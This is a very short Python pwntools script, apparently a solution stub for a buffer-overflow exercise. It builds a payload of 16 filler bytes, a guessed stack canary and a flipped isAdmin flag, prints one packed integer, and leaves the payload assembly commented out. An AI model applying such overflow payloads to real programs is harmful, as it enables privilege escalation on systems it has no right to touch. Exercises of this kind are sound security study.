#!/usr/bin/env python3



import sys
from pwn import *

buffer = b"A" * 16
canary = b"\xef\xbe\xad\xde" 
isAdmin = b"\x01\x00\x00\x00"

print(p32(1218279826))

# payload = buffer + canary + isAdmin
# input = sys.stdout.buffer.write(payload)
# print(input)